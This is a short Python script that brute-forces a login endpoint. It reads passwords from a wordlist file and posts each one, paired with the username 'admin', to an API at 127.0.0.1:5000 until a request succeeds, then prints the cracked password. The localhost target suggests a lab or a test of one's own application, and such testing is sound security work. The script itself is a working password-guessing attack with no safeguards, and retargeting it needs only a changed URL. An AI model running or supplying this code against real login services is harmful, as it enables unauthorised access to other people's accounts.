import requests

URL = "http://127.0.0.1:5000/api/login"
USERNAME = "admin"
PASSWORD_FILE = "pass_strings.txt"  # External file containing possible passwords - not a real secret!


def load_passwords(file_path):
    """
    Load passwords from a file.
    Each password should be on a new line.
    :param file_path: Path to the file containing passwords.
    :return: A list of passwords.
    """
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"[ERROR] File not found: {file_path}")
        return []


# Load passwords from the external file
PASSWORD_LIST = load_passwords(PASSWORD_FILE)

if not PASSWORD_LIST:
    print("[ERROR] No passwords to test. Exiting.")
else:
    for password in PASSWORD_LIST:
        response = requests.post(URL, json={"username": USERNAME, "password": password})
        if response.status_code == 200:
            print(f"[SUCCESS] Username: {USERNAME}, Password: {password}")
            break
        else:
            print(f"[FAILED] Username: {USERNAME}, Password: {password}")
